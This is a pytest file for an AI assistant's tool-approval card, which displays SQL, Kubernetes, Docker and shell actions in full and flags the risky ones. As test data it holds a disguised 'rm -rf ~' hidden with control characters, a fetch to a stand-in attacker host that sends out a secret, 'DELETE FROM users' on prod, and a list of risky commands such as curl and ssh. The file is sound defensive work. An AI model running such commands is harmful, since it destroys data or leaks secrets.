"""The approval card must show exactly what will run, and flag anything risky.

Review findings: SQL, manifests and Docker/Kubernetes targets weren't
shown at all ("Run db_execute"), long commands were cut at 160
characters with whitespace collapsed, and the warning colour only knew a
short denylist, so ``bash``, ``curl``, ``ssh`` looked routine.
"""

from __future__ import annotations

import json

import pytest

from polyglot_ai.ui.panels.inline_approval_card import InlineApprovalCard


def _card(qtbot, tool, args):
    card = InlineApprovalCard(tool, json.dumps(args))
    qtbot.addWidget(card)
    return card


def test_db_execute_shows_the_sql_and_warns(qtbot):
    card = _card(qtbot, "db_execute", {"connection": "prod", "sql": "DELETE FROM users"})
    assert card._label.text() == "Run SQL on prod"
    assert card._detail.text() == "DELETE FROM users"
    assert card._dangerous is True


def test_db_query_shows_the_sql(qtbot):
    card = _card(qtbot, "db_query", {"connection": "prod", "sql": "SELECT 1"})
    assert card._detail.text() == "SELECT 1"
    assert card._dangerous is False


def test_long_manifest_is_shown_in_full_and_scrolls(qtbot):
    yaml = "\n".join(f"line{i}: value" for i in range(40))
    card = _card(qtbot, "k8s_apply", {"yaml": yaml, "context": "prod"})
    assert card._detail.text() == yaml
    assert card._detail_scroll is not None
    assert "prod" in card._label.text()
    assert card._dangerous is True


def test_long_command_tail_is_not_cut_off(qtbot):
    cmd = "pip install " + " ".join(f"pkg{i}" for i in range(60)) + " evil-package"
    card = _card(qtbot, "shell_exec", {"command": cmd})
    assert card._detail.text().endswith("evil-package")


def test_hidden_characters_are_made_visible(qtbot):
    card = _card(qtbot, "shell_exec", {"command": "ls\r\x1b[2Krm -rf ~‮"})
    shown = card._detail.text()
    assert "\\x0d" in shown and "\\x1b" in shown and "\\u202e" in shown
    assert "\r" not in shown and "\x1b" not in shown


@pytest.mark.parametrize(
    "command, risky",
    [
        ("ls -la", False),
        ("git status", False),
        ("git diff HEAD~1", False),
        ("find . -name '*.py'", False),
        ("bash -c 'echo hi'", True),
        ("curl https://example.com", True),
        ("ssh prod", True),
        ("scp a.txt prod:/tmp", True),
        ("git push --force", True),
        ("find . -name '*.tmp' -delete", True),
        ("npm install", True),
    ],
)
def test_warning_colour_uses_an_allowlist(qtbot, command, risky):
    assert _card(qtbot, "shell_exec", {"command": command})._dangerous is risky


@pytest.mark.parametrize(
    "tool, args, title, detail",
    [
        ("k8s_delete_pod", {"pod": "api-1", "namespace": "prod"}, "Delete pod", "prod/api-1"),
        (
            "k8s_scale_deployment",
            {"deployment": "web", "replicas": 0},
            "Scale deployment to 0 replicas",
            "default/web",
        ),
        ("docker_remove", {"name": "db", "force": True}, "Remove container (force)", "db"),
        ("docker_stop", {"container": "web"}, "Stop container", "web"),
    ],
)
def test_every_gated_tool_says_what_it_targets(qtbot, tool, args, title, detail):
    card = _card(qtbot, tool, args)
    assert card._label.text() == title
    assert card._detail.text() == detail


def test_mcp_tool_shows_its_arguments(qtbot):
    card = _card(qtbot, "mcp_fetch_fetch", {"url": "https://attacker.example/?d=secret"})
    assert "attacker.example" in card._detail.text()
